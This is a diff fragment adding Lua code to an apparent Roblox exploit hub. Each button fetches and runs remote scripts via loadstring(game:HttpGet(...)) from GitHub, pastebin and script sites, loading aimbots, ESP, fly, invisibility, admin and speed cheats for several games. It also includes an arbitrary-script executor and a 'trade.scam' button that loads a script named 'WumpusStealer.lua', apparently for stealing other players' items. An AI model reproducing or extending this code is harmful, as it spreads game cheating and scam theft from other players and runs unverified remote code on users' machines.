+      		Chat("bรญลฅฤฤฅ")
+  	end    
+})
+end) 
+
+Tab:CreateButton("Yarhm Hub",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/YarhmScripts/Hub/MurderMystery2/Loader"))()
+end) 
+
+Tab:CreateButton("Dez hub",function()
+local Library = loadstring(game:HttpGet("https://pastebin.com/raw/vff1bQ9F"))()
+local Window = Library.CreateLib("dez.hub", "Ocean")
+local Tab = Window:NewTab("all games")
+local Section = Tab:NewSection("all games")
+Section:NewButton("admin", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Lxte-Cmds-15472"))()
+end)
+Section:NewToggle("fov", "ToggleInfo", function(state)
+    if state then
+        game.Workspace.CurrentCamera.FieldOfView  = 120
+    else
+        game.Workspace.CurrentCamera.FieldOfView  = 80
+    end
+end)
+Section:NewButton("forcefeild-ff", "ButtonInfo", function()
+    --[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+loadstring(game:HttpGet("https://freenote.biz/raw/Fhpx5r5A8M"))()
+end)
+Section:NewButton("tilted fly", "if u die click ir again", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/a-literal-baseplate.-FE-Sd-Boy-16295"))()
+end)
+Section:NewSlider("Speed", "SliderInfo", 300, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)
+    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s
+end)
+Section:NewButton("esp health", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Esp-like-boxes-esp-their-distance-and-name-OPEN-SOURCE-15409"))()
+end)
+Section:NewButton("invisible", "ButtonInfo", function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Invisible%20Gui'))()
+end)
+local Tab = Window:NewTab("prison life")
+local Section = Tab:NewSection("prison life admin")
+Section:NewButton("prison life admin", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Prison-Life-Tiger-Admin-V3-16127"))()
+end)
+local Tab = Window:NewTab("aimbot")
+local Section = Tab:NewSection("aimbot")
+Section:NewButton("aimmerz", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Aimmerz-V2-15471"))()
+end)
+local Tab = Window:NewTab("bedwars")
+local Section = Tab:NewSection("bedwars")
+Section:NewButton("vape.v4", "ButtonInfo", function()
+   loadstring(game:HttpGet("https://rawscripts.net/raw/Vape-V4-For-Roblox_316"))()  
+end)
+local Tab = Window:NewTab("bloxfruits")
+local Section = Tab:NewSection("bloxfruits")
+Section:NewButton("min.hub", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Blox-Fruits-Min-Hub-OP-Gui-15284"))()
+end)
+Section:NewButton("matsune hub", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Blox-Fruits-matsune-Hub-keyless-15806"))()
+end)
+Section:NewButton("redZ Hub-key", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Blox-Fruits-RedZ-Hub-16178"))()
+end)
+local Tab = Window:NewTab("mm2")
+local Section = Tab:NewSection("murder mystery 2")
+Section:NewButton("mm2.autoshoot", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-MM-AUTO-SHOOT-15532"))()
+end)
+Section:NewButton("nexus", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-Nexus-real-16082"))()
+end)
+Section:NewButton("trade.scam", "ButtonInfo", function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/psychic-octo-invention/main/WumpusStealer.lua", true))()
+
+getgenv().gui = false
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JoystickpIays/psychic-octo-invention/main/Notification.lua", true))()
+end)
+end) 
+
+Tab:CreateButton("Executor (By jnbf",function()
+-- UI Loader Script
+local ScreenGui = Instance.new("ScreenGui")
+local Frame = Instance.new("Frame")
+local ExecuteButton = Instance.new("TextButton")
+local ClearButton = Instance.new("TextButton")
+local TextBox = Instance.new("TextBox")
+
+-- Properties
+ScreenGui.Name = "ExecutorUI"
+ScreenGui.Parent = game:GetService("CoreGui")
+
+Frame.Parent = ScreenGui
+Frame.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+Frame.BorderSizePixel = 0
+Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+Frame.Size = UDim2.new(0, 400, 0, 300)
+Frame.Visible = true
+Frame.Active = true
+Frame.Draggable = true
+
+TextBox.Parent = Frame
+TextBox.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+TextBox.Position = UDim2.new(0.05, 0, 0.05, 0)
+TextBox.Size = UDim2.new(0.9, 0, 0.7, 0)
+TextBox.Font = Enum.Font.SourceSans
+TextBox.PlaceholderText = "Enter script here..."
+TextBox.Text = ""
+TextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextBox.TextSize = 18
+TextBox.TextWrapped = true
+TextBox.TextYAlignment = Enum.TextYAlignment.Top
+TextBox.ClearTextOnFocus = false
+TextBox.MultiLine = true
+
+ExecuteButton.Parent = Frame
+ExecuteButton.BackgroundColor3 = Color3.fromRGB(0, 128, 255)
+ExecuteButton.Position = UDim2.new(0.05, 0, 0.8, 0)
+ExecuteButton.Size = UDim2.new(0.425, 0, 0.15, 0)
+ExecuteButton.Font = Enum.Font.SourceSans
+ExecuteButton.Text = "Execute"
+ExecuteButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ExecuteButton.TextSize = 18
+
+ClearButton.Parent = Frame
+ClearButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+ClearButton.Position = UDim2.new(0.525, 0, 0.8, 0)
+ClearButton.Size = UDim2.new(0.425, 0, 0.15, 0)
+ClearButton.Font = Enum.Font.SourceSans
+ClearButton.Text = "Clear"
+ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+ClearButton.TextSize = 18
+
+-- Functions
+local function ExecuteScript()
+    local scriptText = TextBox.Text
+    if scriptText and scriptText ~= "" then
+        loadstring(scriptText)()
+    end
+end
+
+local function ClearText()
+    TextBox.Text = ""
+end
+
+ExecuteButton.MouseButton1Click:Connect(ExecuteScript)
+ClearButton.MouseButton1Click:Connect(ClearText)
+
+-- Toggle UI Visibility
+local UIS = game:GetService("UserInputService")
+local function onKeyPress(input)
+    if input.KeyCode == Enum.KeyCode.RightShift then
+        Frame.Visible = not Frame.Visible
+    end
+end
+
+UIS.InputBegan:Connect(onKeyPress)
+end) 
+
+Tab:CreateButton("Caveira Hub",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Powerblack09yt/Anime-fighters-script/main/Caveirahub",true))();
+end) 
+
+Tab:CreateButton("Sander X Hub",function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sXPiterXs1111/Sanderx3.25/main/sanderxv3.25.lua"))()
+end) 
+
+Tab:CreateButton("UNXHub",function()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/uHeyCaf/ArrayField/main/UNXHub'))()
 end) 
 
 Tab:CreateButton("Kaov Hub",function()
